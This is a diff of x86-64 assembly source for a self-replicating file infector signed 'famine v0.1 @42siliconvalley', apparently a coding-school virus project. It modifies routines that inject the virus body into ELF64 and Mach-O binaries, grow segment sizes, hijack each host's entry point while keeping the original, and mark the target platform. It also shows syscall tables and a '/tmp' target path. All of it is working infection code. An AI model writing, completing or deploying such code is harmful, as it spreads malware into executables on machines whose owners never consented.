@@ -289,7 +289,7 @@ insert_elf64:                                                   ; expecting data
 
                 mov         r14, rdi                            ; code segment Elf64_Phdr*
 
-                lea         rdi, [r15 + rax]                     ; data + p_offset + p_filesz
+                lea         rdi, [r15 + rax]                    ; data + p_offset + p_filesz
                 mov         rsi, rdi                            ; save: end of segment
                 xor         al, al
                 mov         rcx, _finish - _start
@@ -310,8 +310,9 @@ insert_elf64:                                                   ; expecting data
                 ;r13 = new entry point
 
                 mov         rax, qword [r15 + 0x18]             ; entry point
-                mov         [rdi - 0x08], rax                   ; _finish - 8 = entry
-                mov         [rdi - 0x10], r13                   ; _finish - 16 = pie_address
+                mov         qword [rdi - 8], rax                ; _finish - 8 = entry
+                mov         qword [rdi - 16], r13               ; _finish - 16 = pie_address
+                mov         byte [rdi - 17], 0
                 mov         qword [r15 + 0x18], r13             ; fix entry point
                 mov         rax, _finish - _start
                 add         qword [r14 + 0x20], rax             ; increase p_filesz
@@ -332,6 +333,8 @@ insert_elf64:                                                   ; expecting data
 %define         LC_MAIN             0x80000028
 
 insert_macho64:                                                 ; expecting data in rdi
+                push        r12
+                push        r13
                 mov         rsi, rdi
                 mov         ecx, dword [rdi + 0x10]             ; mach_header_64.ncmds
                 add         rdi, 0x20
@@ -345,7 +348,7 @@ insert_macho64:                                                 ; expecting data
                                                                 ; XXX note: expecting first section of __TEXT segment
                                                                 ; to be the __text section
                 cmp         rax, qword [rdi + 0x48 + 0x10]      ; this should work for most but not all binaries
-                jnz         .return                
+                jnz         .return
                 mov         rdx, 0x0000747865745F5F             ; "__text",0,0
                 cmp         rdx, qword [rdi + 0x48]             ; section_64.sectname
                 jnz         .return
@@ -362,7 +365,7 @@ insert_macho64:                                                 ; expecting data
                 mov         rdi, rsi
                 mov         eax, dword [r12 + 0x48 + 0x30]      ; file offset of __text section
                 add         rdi, rax
-                mov         ecx, (_finish - _start) + 0x50      ; extra padding
+                mov         ecx, (_finish - _start) + 0x50      ; size + extra padding
                 sub         rdi, rcx
 
                 xor         al, al
@@ -370,34 +373,30 @@ insert_macho64:                                                 ; expecting data
                 test        ecx, ecx
                 ja          .return                             ; not enough room
 
-                dec         rdi
                 mov         ecx, (_finish - _start)
                 sub         rdi, rcx
+                mov         rdx, rdi
                 mov         rax, rdi
                 sub         rax, rsi                            ; rax == new entry point
                 lea         rsi, [rel _start]
                 rep         movsb
 
-                mov         rdx, qword [r13 + 8]
+                mov         rcx, qword [r13 + 8]                ; get entry point
                 mov         qword [r13 + 8], rax
-                dec         rdi
-                mov         qword [rdi - 8], rdx                ; store entry
+
+                mov         qword [rdi - 8], rcx                ; store entry point
                 mov         qword [rdi - 16], rax               ; store pos
+                mov         byte [rdi - 17], 1                  ; mark mach-o
                 jmp         .return
 
 .next_lcmd:     mov         eax, dword [rdi + 4]                ; cmdsize
                 add         rdi, rax
                 dec         ecx
                 jnz        .lc_segment_64
-.return         ret
+.return         pop         r13
+                pop         r12
+                ret
 
-
-_platform:
-%ifidn __OUTPUT_FORMAT__, elf64
-                db 0
-%elifidn __OUTPUT_FORMAT__, macho64
-                db 1
-%endif
 
 linux_syscalls          db 0x02, 0x03, 0x05, 0x09, 0x0b, 0x4e, 0x51
 darwin_syscalls         db 0x05, 0x06, 0xbd, 0xc5, 0x49, 0xc4, 0x0d
@@ -422,6 +421,14 @@ _translate_syscall:                                             ; expecting r15 
 
 slash_tmp   db "/tmp",0
 signature   db "famine v0.1 @42siliconvalley",0
+
+_platform:
+%ifidn __OUTPUT_FORMAT__, elf64
+            db 0
+%elifidn __OUTPUT_FORMAT__, macho64
+            db 1
+%endif
+
 pie_address dq _start
 entry       dq _host
 _finish     equ $
